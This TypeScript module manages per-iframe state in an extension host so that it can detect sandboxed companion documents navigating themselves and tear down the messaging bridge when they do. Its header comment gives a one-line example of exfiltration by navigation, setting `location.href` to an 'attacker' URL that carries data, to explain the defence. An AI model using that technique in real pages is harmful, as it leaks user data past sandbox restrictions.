// Per-iframe-element state for every `ExtensionHost` transport: the srcdoc frame
// (desktop, island, web, MCP App widgets) and the sandbox page (the MV3 extension
// dashboard). Split out of `ExtensionHost.tsx` so the navigation and
// document-handoff decisions are testable without a DOM.
//
// WHY: the companion document's `connect-src 'none'` CSP blocks fetch/XHR/WebSocket,
// but CSP fetch directives do not govern NAVIGATION. A companion can run
// `location.href = "https://attacker/?d=…"`, which leaks that one URL, and the
// attacker document then lives in the same iframe, so `event.source ===
// iframe.contentWindow` still holds. Two host decisions must therefore outlive a
// single effect run and be keyed on the iframe ELEMENT:
//   1. the companion document (and its nonce) is handed over at most once per
//      element, so a handshake re-run (e.g. after a `granted` change) never sends
//      it to whatever document the frame holds now;
//   2. the channel port is transferred at most once per element, so a document
//      that took over the frame cannot handshake again with a leaked nonce;
//   3. any load beyond the page's own load and the companion write's load means
//      the frame navigated itself. The host then tears the bridge down for good.

import {
	SANDBOX_DOCUMENT_KIND,
	type SandboxDocumentMessage,
	shouldSendSandboxDocument,
} from "./extension-host-handshake.ts";

/** The sandbox page's own load, then the load that `document.open/write/close`
 *  of the companion document fires. Anything after these is a navigation. */
export const SANDBOX_PAGE_EXPECTED_LOADS = 2;

/** A srcdoc frame loads its companion document exactly once; a changed document
 *  remounts the element (ExtensionHost keys it), so a second load on the same
 *  element is the companion navigating itself. */
export const SRCDOC_EXPECTED_LOADS = 1;

export interface SandboxFrameState {
	/** Whether the companion document (with its nonce) was already sent. */
	documentSent: boolean;
	/** `load` events observed on the element. */
	loads: number;
	/** Set once the frame navigated away from the companion document. */
	navigated: boolean;
	/** The live bridge's teardown, replaced on each handshake effect run. */
	onNavigated: (() => void) | null;
	/** Whether a channel port was already transferred into this element. */
	portTransferred: boolean;
}

const frames = new WeakMap<EventTarget, SandboxFrameState>();

/**
 * The state for one companion iframe element, created (with its persistent
 * `load` listener) the first time the host bridges that element. Call it before
 * the element can load, i.e. from the commit that inserted it. `expectedLoads` is
 * how many loads the transport itself causes before the companion runs.
 */
export function sandboxFrameState(
	frame: EventTarget,
	expectedLoads: number = SANDBOX_PAGE_EXPECTED_LOADS
): SandboxFrameState {
	const existing = frames.get(frame);
	if (existing) {
		return existing;
	}
	const state: SandboxFrameState = {
		documentSent: false,
		portTransferred: false,
		loads: 0,
		navigated: false,
		onNavigated: null,
	};
	frame.addEventListener("load", () => {
		state.loads += 1;
		if (state.navigated || state.loads <= expectedLoads) {
			return;
		}
		state.navigated = true;
		const teardown = state.onNavigated;
		state.onNavigated = null;
		teardown?.();
	});
	frames.set(frame, state);
	return state;
}

/**
 * Route a detected self-navigation to this effect run's `teardown`, then evict
 * the navigated document so it stops running in the host. Returns the disarm for
 * the effect cleanup. `srcdoc` wins over `src`, so a srcdoc frame drops it first.
 */
export function armNavigationTeardown(
	state: SandboxFrameState,
	frame: Element,
	teardown: () => void
): () => void {
	state.onNavigated = () => {
		teardown();
		frame.removeAttribute("srcdoc");
		frame.setAttribute("src", "about:blank");
	};
	return () => {
		state.onNavigated = null;
	};
}

interface SandboxFrameWindow {
	readonly contentWindow: {
		postMessage(message: unknown, targetOrigin: string): void;
	} | null;
}

/**
 * Answer the sandbox page's `ryu-sandbox-ready` with the companion document and
 * nonce, at most once per element (`state` is `null` for the srcdoc transport,
 * which never sends one). Returns whether the message was that request.
 */
export function sendSandboxDocument(
	state: SandboxFrameState | null,
	event: { data: unknown; source: unknown },
	frame: SandboxFrameWindow,
	document: { srcdoc: string; nonce: string }
): boolean {
	if (
		!(
			state &&
			shouldSendSandboxDocument(event.data, {
				alreadySent: state.documentSent,
				fromThisFrame: event.source === frame.contentWindow,
			})
		)
	) {
		return false;
	}
	state.documentSent = true;
	const message: SandboxDocumentMessage = {
		html: document.srcdoc,
		kind: SANDBOX_DOCUMENT_KIND,
		nonce: document.nonce,
	};
	// Opaque-origin page: "*" is unavoidable; the document carries no token.
	frame.contentWindow?.postMessage(message, "*");
	return true;
}
